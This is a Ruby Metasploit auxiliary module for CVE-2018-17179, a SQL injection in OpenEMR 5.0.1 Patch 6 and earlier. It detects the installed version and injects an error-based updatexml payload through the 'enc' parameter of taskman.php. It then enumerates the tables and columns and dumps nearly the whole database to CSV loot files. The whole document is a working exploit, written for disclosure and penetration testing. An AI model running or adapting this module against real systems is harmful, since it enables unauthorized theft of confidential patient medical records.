require 'csv'

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::SQLi

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'OpenEMR 5.0.1 Patch 6 SQLi Dump',
      'Description' => '
        This module exploits a SQLi vulnerability found in
        OpenEMR version 5.0.1 Patch 6 and lower. The
        vulnerability allows the contents of the entire
        database (with exception of log and task tables) to be
        extracted.
        This module saves each table as a `.csv` file in your
        loot directory and has been tested with
        OpenEMR 5.0.1 (3).
      ',
      'License' => MSF_LICENSE,
      'Author' =>
        [
          'Will Porter <will.porter[at]lodestonesecurity.com>'
        ],
      'References' => [
        ['CVE', '2018-17179'],
        ['URL', 'https://github.com/openemr/openemr/commit/3e22d11c7175c1ebbf3d862545ce6fee18f70617']
      ],
      'DisclosureDate' => '2019-05-17'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to the OpenEMR installation', '/openemr'])
      ]
    )
  end

  def uri
    target_uri.path
  end

  def openemr_version
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(uri, 'admin.php')
    )
    vprint_status("admin.php response code: #{res.code}")
    document = Nokogiri::HTML(res.body)
    document.css('tr')[1].css('td')[3].text
  rescue StandardError
    ''
  end

  def check
    # Check version
    print_status('Trying to detect installed version')
    version = openemr_version
    return Exploit::CheckCode::Unknown if version.empty?

    vprint_status("Version #{version} detected")
    version.sub! ' (', '.'
    version.sub! ')', ''
    version.strip!

    return Exploit::CheckCode::Safe unless Rex::Version.new(version) < Rex::Version.new('5.0.1.7')

    Exploit::CheckCode::Appears
  end

  def get_response(payload)
    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(uri, 'interface', 'forms', 'eye_mag', 'taskman.php'),
      'vars_get' => {
        'action' => 'make_task',
        'from_id' => '1',
        'to_id' => '1',
        'pid' => '1',
        'doc_type' => '1',
        'doc_id' => '1',
        'enc' => "1' and updatexml(1,concat(0x7e, (#{payload})),0) or '"
      }
    )
  end

  def save_csv(data, table)
    # Use the same gsub pattern as store_loot
    # this will put the first 8 safe characters of the tablename
    # in the filename in the loot directory
    safe_table = table.gsub(/[^a-z0-9\.\_]+/i, '')
    store_loot(
      "openemr.#{safe_table}.dump",
      'application/CSV',
      rhost,
      data.map(&:to_csv).join,
      "#{safe_table}.csv"
    )
  end

  def dump_all
    sqli_opts = {
      truncation_length: 31, # slices of 31 bytes of the query response are returned
      encoder: :base64, # the web application messes up multibyte characters, better encode
      verbose: datastore['VERBOSE']
    }
    sqli = create_sqli(dbms: MySQLi::Common, opts: sqli_opts) do |payload|
      res = get_response(payload)
      if res && (response = res.body[%r{XPATH syntax error: '~(.*?)'</font>}m, 1])
        response
      else
        ''
      end
    end
    unless sqli.test_vulnerable
      fail_with Failure::NotVulnerable, 'The target does not seem vulnerable.'
    end
    print_good 'The target seems vulnerable.'
    db_version = sqli.version
    print_status("DB Version: #{db_version}")
    print_status('Enumerating tables, this may take a moment...')
    tables = sqli.enum_table_names
    num_tables = tables.length
    print_status("Identified #{num_tables} tables.")
    # These tables are impossible to fetch because they increase each request
    skiptables = %w[form_taskman log log_comment_encrypt]
    # large table containing text in different languages, >4mb in size
    skiptables << 'lang_definitions'
    tables.each_with_index do |table, i|
      if skiptables.include?(table)
        print_status("Skipping table (#{i + 1}/#{num_tables}): #{table}")
      else
        columns_of_table = sqli.enum_table_columns(table)
        print_status("Dumping table (#{i + 1}/#{num_tables}): #{table}(#{columns_of_table.join(', ')})")
        table_data = sqli.dump_table_fields(table, columns_of_table)
        table_data.unshift(columns_of_table)
        save_csv(table_data, table)
      end
    end
    print_status("Dumped all tables to #{Msf::Config.loot_directory}")
  end

  def run
    dump_all
  end
end
